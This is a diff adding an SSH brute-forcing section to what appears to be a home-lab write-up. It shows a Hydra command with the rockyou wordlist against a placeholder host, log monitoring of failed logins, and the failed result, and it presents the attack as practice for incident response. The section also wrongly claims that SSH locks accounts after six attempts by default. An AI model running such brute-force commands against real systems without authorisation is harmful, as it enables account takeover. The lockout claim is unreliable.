@@ -82,8 +82,20 @@ Like I mentioned earlier I'll be using Nmap a powerful reconnaissance tool.
 ## SSH Brute-Forcing
 Now that SSH is up and running, it's time to simulate an attack.
 
-- Change Password:
- Since strong passwords take too long to brute-force, I'll change mine to something weak:j
+- Step 1: Running the Brute-force Attack
+ Using Hydra, we can attempt a brute-force attack on SSH with
+  ``` bash
+   hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
 
+- Step 2: Monitor the login attempts
+  While hydra is running the attack, we can head over to the target and see all the failed logins
+  ``` bash
+  sudo tail -f /var/log/auth.log | grep "Failed password"
 
+- Unsuccessful brute-force
+  The brute-force attack failed, showing:
+   ``` bash
+   1 of 1 target completed, 0 valid passwords found.
+This outcome was expected since SSH by default has an account lockout policy after every 6 attempts. 
 
+However, the main goal was to generate "noise" and trigger security alerts for incident response.
